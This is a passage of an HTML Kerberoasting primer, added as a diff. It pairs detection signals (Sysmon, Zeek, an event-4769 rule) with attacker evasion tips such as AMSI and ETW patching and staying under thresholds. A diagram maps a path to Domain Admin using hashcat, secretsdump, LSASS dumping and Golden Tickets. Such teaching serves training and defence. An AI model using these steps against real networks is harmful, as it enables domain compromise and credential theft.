+          <tr><td>Event 7 — image loaded</td><td>reflectively-loaded .NET assemblies</td><td>unsigned in-memory assemblies are a red flag</td></tr>
+          <tr><td>Event 10 — process access</td><td><strong>anything that opens <code>lsass.exe</code></strong></td><td>handle rights + caller process. nanodump still fires this with different rights than mimikatz — modern EDR signatures the right combinations</td></tr>
+          <tr><td>Event 11 — file create</td><td>dropped tools, hash files, lsass.dmp on disk</td><td>filename patterns and content type — even renamed tools get caught by content signatures</td></tr>
+          <tr><td>Event 22 — DNS query</td><td>lookups to attacker domains, AD enumeration DNS</td><td>volumetric anomalies tie back to recon</td></tr>
+        </tbody>
+      </table>
+      <p style="font-size: 13.5px; color: var(--muted);">
+        Sysmon countermove is <em>in-memory only execution</em> (<code>execute-assembly</code>, BOFs) plus AMSI + ETW patching before any PowerShell. Even then, Event 10 on LSASS is hard to dodge — which is the entire reason operators prefer <code>reg save</code> over LSASS dumps where possible.
+      </p>
+
+      <h3>layer 3 · network / Kerberos protocol signals</h3>
+      <p>A defender with NSM (Zeek, Suricata, Corelight) sees Kerberos protocol metadata directly — long before any Windows event fires. Worth knowing what's <em>actually on the wire</em>:</p>
+      <ul>
+        <li><strong>AS-REQ / AS-REP / TGS-REQ / TGS-REP</strong> are unencrypted at the protocol level. The tickets themselves are encrypted blobs, but the surrounding metadata (user, SPN, encryption type, timestamps) is in plaintext.</li>
+        <li><strong>Zeek's <code>kerberos.log</code></strong> records every Kerberos request: client, service, encryption type, success/failure. One <code>zeek-cut</code> filter on <code>cipher=rc4-hmac</code> for unusual SPNs surfaces every kerberoasting run in the environment.</li>
+        <li><strong>Source-host anomalies.</strong> A TGS-REQ from a workstation that has never requested a ticket for that SPN before is a high-confidence signal. SOCs with UEBA (User and Entity Behavior Analytics) profile per-user/per-host SPN access patterns and alert on deviation.</li>
+        <li><strong>Encryption downgrade.</strong> Even if you avoid RC4 on AES-capable accounts, requesting AES tickets for accounts that <em>only</em> support AES looks normal — but any RC4 ticket request in an environment that's standardized on AES stands out instantly.</li>
+      </ul>
+
+      <p style="margin-top: 18px;">
+        Mature SOCs run a single canonical rule: <strong>4769 from a single source requesting tickets for &gt;3 SPNs within a 5-minute window with TicketEncryptionType 0x17</strong>. That one rule fires on Rubeus/GetUserSPNs defaults. The countermove is patience and selectivity. The Snowden-grade version of that countermove is patience, selectivity, AES-aware targeting, and accepting that you may not be able to kerberoast at all in a fully AES-modernized environment.
+      </p>
+    </section>
+
+    <!-- §10 -->
+    <section>
+      <h2 id="flow">the whole flow<a class="anchor" href="#flow">#</a></h2>
+
+      <figure class="diagram">
+        <svg viewBox="0 0 1100 620" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="From Kerberoasted hash to Domain Admin">
+          <defs>
+            <marker id="ar1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+              <path d="M 0 0 L 10 5 L 0 10 z" fill="#7a8a7f"/>
+            </marker>
+            <marker id="ar2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
+              <path d="M 0 0 L 10 5 L 0 10 z" fill="#5bd66d"/>
+            </marker>
+          </defs>
+          <style>
+            .box-s { fill: #11161300; stroke: #2a3a30; stroke-width: 1; }
+            .box-w { fill: #0c1410;   stroke: #5bd66d; stroke-width: 1.2; }
+            .box-e { fill: #0a0e0b;   stroke: #5bd66d; stroke-width: 1.6; }
+            .lbl-s { font: 12.5px 'JetBrains Mono', monospace; fill: #d6e3d8; font-weight: 600; }
+            .lbl-su{ font: 10.5px 'JetBrains Mono', monospace; fill: #7a8a7f; }
+            .lbl-n { font: 9.5px 'JetBrains Mono', monospace; fill: #5bd66d; letter-spacing: 0.1em; }
+            .lbl-w { font: 12px 'JetBrains Mono', monospace; fill: #5bd66d; font-weight: 600; }
+            .conn  { stroke: #7a8a7f; stroke-width: 1; fill: none; }
+            .conn-g{ stroke: #5bd66d; stroke-width: 1.2; fill: none; }
+          </style>
+
+          <!-- =========================================
+               row 1: linear chain (steps 1-4)
+               ========================================= -->
+          <rect x="60"  y="40" width="160" height="80" rx="4" class="box-s"/>
+          <text x="140" y="58" text-anchor="middle" class="lbl-n">STEP 1</text>
+          <text x="140" y="82" text-anchor="middle" class="lbl-s">TGS-REP hash</text>
+          <text x="140" y="102" text-anchor="middle" class="lbl-su">$krb5tgs$23$...</text>
+          <line x1="220" y1="80" x2="248" y2="80" class="conn" marker-end="url(#ar1)"/>
+
+          <rect x="250" y="40" width="160" height="80" rx="4" class="box-s"/>
+          <text x="330" y="58" text-anchor="middle" class="lbl-n">STEP 2</text>
+          <text x="330" y="82" text-anchor="middle" class="lbl-s">crack offline</text>
+          <text x="330" y="102" text-anchor="middle" class="lbl-su">hashcat -m 13100</text>
+          <line x1="410" y1="80" x2="438" y2="80" class="conn" marker-end="url(#ar1)"/>
+
+          <rect x="440" y="40" width="180" height="80" rx="4" class="box-s"/>
+          <text x="530" y="58" text-anchor="middle" class="lbl-n">STEP 3</text>
+          <text x="530" y="82" text-anchor="middle" class="lbl-s">cleartext password</text>
+          <text x="530" y="102" text-anchor="middle" class="lbl-su">sqlsvc : P@ssw0rd</text>
+          <line x1="620" y1="80" x2="648" y2="80" class="conn" marker-end="url(#ar1)"/>
+
+          <rect x="650" y="40" width="180" height="80" rx="4" class="box-s"/>
+          <text x="740" y="58" text-anchor="middle" class="lbl-n">STEP 4</text>
+          <text x="740" y="82" text-anchor="middle" class="lbl-s">LDAP enumerate</text>
+          <text x="740" y="102" text-anchor="middle" class="lbl-su">groups · ACLs · SPN</text>
+
+          <!-- step 4 → FORK (curve down to centered fork below) -->
+          <path d="M 740 120 C 740 160 600 160 550 200" class="conn" fill="none" marker-end="url(#ar1)"/>
+
+          <!-- =========================================
+               row 2: FORK (centered)
+               ========================================= -->
+          <rect x="375" y="200" width="350" height="80" rx="5" class="box-w"/>
+          <text x="550" y="222" text-anchor="middle" class="lbl-n">★ FORK · five wins</text>
+          <text x="550" y="246" text-anchor="middle" class="lbl-w">where does this account go?</text>
+          <text x="550" y="266" text-anchor="middle" class="lbl-su">read BloodHound's outbound-control panel</text>
+
+          <!-- branches from FORK bottom (550, 280) to win tops at y=320 -->
+          <line x1="550" y1="280" x2="140" y2="320" class="conn"/>
+          <line x1="550" y1="280" x2="345" y2="320" class="conn"/>
+          <line x1="550" y1="280" x2="550" y2="320" class="conn"/>
+          <line x1="550" y1="280" x2="755" y2="320" class="conn"/>
+          <line x1="550" y1="280" x2="960" y2="320" class="conn"/>
+
+          <!-- =========================================
+               row 3: five wins
+               ========================================= -->
+          <rect x="50"  y="320" width="180" height="80" rx="4" class="box-s"/>
+          <text x="140" y="342" text-anchor="middle" class="lbl-s">SPN host</text>
+          <text x="140" y="362" text-anchor="middle" class="lbl-su">log in → Potato →</text>
+          <text x="140" y="380" text-anchor="middle" class="lbl-su">SYSTEM on that host</text>
+
+          <rect x="255" y="320" width="180" height="80" rx="4" class="box-s"/>
+          <text x="345" y="342" text-anchor="middle" class="lbl-s">local admin · N hosts</text>
+          <text x="345" y="362" text-anchor="middle" class="lbl-su">credential harvest</text>
+          <text x="345" y="380" text-anchor="middle" class="lbl-su">on each</text>
+
+          <rect x="460" y="320" width="180" height="80" rx="4" class="box-s"/>
+          <text x="550" y="342" text-anchor="middle" class="lbl-s">ACL gold mine</text>
+          <text x="550" y="362" text-anchor="middle" class="lbl-su">GenericWrite, WriteDacl</text>
+          <text x="550" y="380" text-anchor="middle" class="lbl-su">walk to DA</text>
+
+          <rect x="665" y="320" width="180" height="80" rx="4" class="box-s"/>
+          <text x="755" y="342" text-anchor="middle" class="lbl-s">DCSync rights</text>
+          <text x="755" y="362" text-anchor="middle" class="lbl-su">secretsdump -just-dc</text>
+          <text x="755" y="380" text-anchor="middle" class="lbl-su">end of game</text>
+
+          <rect x="870" y="320" width="180" height="80" rx="4" class="box-s"/>
+          <text x="960" y="342" text-anchor="middle" class="lbl-s">already in DA</text>
+          <text x="960" y="362" text-anchor="middle" class="lbl-su">log into a DC</text>
+          <text x="960" y="380" text-anchor="middle" class="lbl-su">end of game</text>
+
+          <!-- =========================================
+               wins #1, #2, #3 → credential harvest
+               ========================================= -->
+          <path d="M 140 400 C 200 430 350 440 470 460" class="conn-g" fill="none"/>
+          <path d="M 345 400 C 380 430 460 445 510 460" class="conn-g" fill="none"/>
+          <line x1="550" y1="400" x2="550" y2="460" class="conn-g"/>
+
+          <rect x="420" y="460" width="260" height="70" rx="4" class="box-w"/>
+          <text x="550" y="482" text-anchor="middle" class="lbl-s">credential harvest</text>
+          <text x="550" y="502" text-anchor="middle" class="lbl-su">reg save · LSASS dump</text>
+          <text x="550" y="520" text-anchor="middle" class="lbl-su">→ DA cached on this box?</text>
+
+          <!-- credential harvest → DA -->
+          <line x1="550" y1="530" x2="550" y2="558" class="conn-g" marker-end="url(#ar2)"/>
+
+          <!-- =========================================
+               final box: DOMAIN ADMIN
+               ========================================= -->
+          <rect x="380" y="560" width="340" height="50" rx="5" class="box-e"/>
+          <text x="550" y="580" text-anchor="middle" class="lbl-w">★ DOMAIN ADMIN</text>
+          <text x="550" y="598" text-anchor="middle" class="lbl-su">pass-the-hash / pass-the-ticket · Golden Ticket persistence</text>
+
+          <!-- wins #4 and #5 jump straight to DA (around the credential harvest) -->
+          <path d="M 755 400 C 800 470 760 530 720 575" class="conn-g" fill="none" marker-end="url(#ar2)"/>
+          <path d="M 960 400 C 1000 470 900 560 720 590" class="conn-g" fill="none" marker-end="url(#ar2)"/>
+        </svg>
+        <figcaption>The full chain from a roasted hash. The linear chain (steps 1–4) ends at the FORK, where BloodHound tells you which of five paths your cracked account takes. Most engagements travel through win #1 or #2 → credential harvest → DA. Wins #4 and #5 skip straight to the end.</figcaption>
+      </figure>
+    </section>
+
+    <!-- §11 -->
+    <section>
+      <h2 id="deeper">going deeper<a class="anchor" href="#deeper">#</a></h2>
+
+      <h3>offensive</h3>
+      <ul>
+        <li><strong>Tim Medin — <em>"Attacking Microsoft Kerberos: Kicking the Guard Dog of Hades"</em></strong> (DerbyCon 2014). The original talk that coined Kerberoasting and showed the attack working in the wild. Read this first if you want the genesis.</li>
+        <li><strong>Will Schroeder (harmj0y) — <em>"Kerberoasting Without Mimikatz"</em></strong> (2016). The operational follow-up that built the tooling and made the attack mainstream. Still the clearest write-up of the protocol-level mechanics.</li>
+        <li><strong>SpecterOps blog — targeted Kerberoasting, AS-REP roasting, gMSA exploitation.</strong> The current research front.</li>
+        <li><strong>HackTricks → Kerberos / Active Directory.</strong> Exhaustive cheat-sheet, updated.</li>
+        <li><strong>BloodHound docs — outbound-object-control queries.</strong> The reason BloodHound is the operator's first move after enumeration.</li>
+      </ul>
+
+      <h3>defensive</h3>
+      <ul>
+        <li><strong>MITRE ATT&amp;CK — T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting).</strong> The canonical defender mapping, with detection logic, mitigations, and threat-actor groups observed using it.</li>
+        <li><strong>Sean Metcalf (adsecurity.org) — Kerberoasting detection series.</strong> Defender-side angle, including event-log queries and Group Policy hardening.</li>
+        <li><strong>Microsoft — "Detecting and Preventing Kerberoasting" (security baselines).</strong> Official MS detection guidance and the recommended <code>msDS-SupportedEncryptionTypes</code> hardening.</li>
+        <li><strong>Sigma rule repository — <code>win_susp_kerberoasting.yml</code></strong> and related. SOC-deployable detection content.</li>
+        <li><strong>Zeek <code>kerberos.log</code> + Corelight content packs.</strong> NSM-layer detection of the protocol patterns.</li>
+      </ul>
+
+      <h3>what to read next</h3>
+      <p>
+        Three attack surfaces sit immediately adjacent to Kerberoasting. Each is its own discipline — and each deserves its own continuation primer in this series.
+      </p>
+      <ul>
+        <li><strong>"Certified Pre-Owned" (SpecterOps — Will Schroeder &amp; Lee Christensen, 2021)</strong> — the canonical paper on Active Directory Certificate Services abuse (ESC1–ESC15). Once you've roasted an account, ask: does it have any certificate-template enrollment rights? Many ADCS misconfigurations hand you Domain Admin via a single certificate request, no cracking required. <em>Future primer in this series:</em> "You found an ADCS template. Your move."</li>
+        <li><strong>S4U2self / S4U2proxy and the full delegation surface.</strong> Win #6 above is the entry point. The deep version walks through every <code>userAccountControl</code> delegation bit, the protocol-level S4U exchange, RBCD setup with a controlled machine account, and the Printer Bug / PetitPotam coercion primitives that turn unconstrained delegation into DA. <em>Future primer:</em> "You have delegation rights. Your move."</li>
+        <li><strong>KDS Root Key extraction (Golden gMSA).</strong> gMSA passwords are "uncrackable" only as long as the KDS Root Key is protected. With SYSTEM on a DC, you can extract the root key and compute every gMSA password in the forest offline. Tool: <code>GoldenGMSA</code>. <em>Future primer:</em> "You have SYSTEM on a DC. Your move."</li>
+      </ul>
+
+      <h3>practice</h3>
+      <ul>
+        <li><strong>TryHackMe — "Attacking Kerberos"</strong>, <strong>"Active Directory Basics"</strong>.</li>
+        <li><strong>HackTheBox — Sauna, Forest, Active.</strong> Each has a Kerberoasting (or AS-REP) step in its solution.</li>
+        <li><strong>GOAD (Game of Active Directory)</strong> — free locally-deployable AD lab with Kerberoastable accounts pre-seeded. Burn it for a weekend.</li>
+      </ul>
+
+      <p style="margin-top:32px; color:var(--muted); font-style:italic;">
+        Next continuation primers in this series will pick up from other AD findings — AS-REP roastable accounts, NTLM hashes you can't crack, SeImpersonate, DCSync rights, NTLM relay primitives. Each one starts from the artifact and walks the chain forward.
+      </p>
+    </section>
+
+  </article>
+</main>
+
+<footer class="primer-foot">
+  <span>primer · kerberoasted-hash · sudobyter / smarter</span>
+  <span><a href="../">aliwaleed.xyz</a> · <code>&lt;/sudobyter&gt;</code></span>
+</footer>
+
+<script>
+  (function () {
+    const bar = document.getElementById('progress');
+    const article = document.querySelector('.primer-article');
+    function update() {
+      const rect = article.getBoundingClientRect();
+      const total = rect.height - window.innerHeight;
+      const passed = Math.min(Math.max(-rect.top, 0), total);
+      const pct = total > 0 ? (passed / total) * 100 : 0;
+      bar.style.setProperty('--progress', pct.toFixed(1) + '%');
+    }
+    window.addEventListener('scroll', update, { passive: true });
+    window.addEventListener('resize', update);
+    update();
+  })();
+
+  (function () {
+    const links = document.querySelectorAll('#toc a[href^="#"]');
+    const targets = [...links].map(a => document.querySelector(a.getAttribute('href'))).filter(Boolean);
+    if (!targets.length) return;
+    const byId = new Map();
+    targets.forEach((el, i) => byId.set(el.id, links[i]));
+    const io = new IntersectionObserver((entries) => {
+      const visible = entries.filter(e => e.isIntersecting)
+        .sort((a, b) => a.boundingClientRect.top - b.boundingClientRect.top);
+      if (!visible.length) return;
+      links.forEach(l => l.classList.remove('active'));
+      const link = byId.get(visible[0].target.id);
+      if (link) link.classList.add('active');
+    }, { rootMargin: '-80px 0px -60% 0px', threshold: 0 });
+    targets.forEach(t => io.observe(t));
+  })();
+</script>
+</body>
+</html>
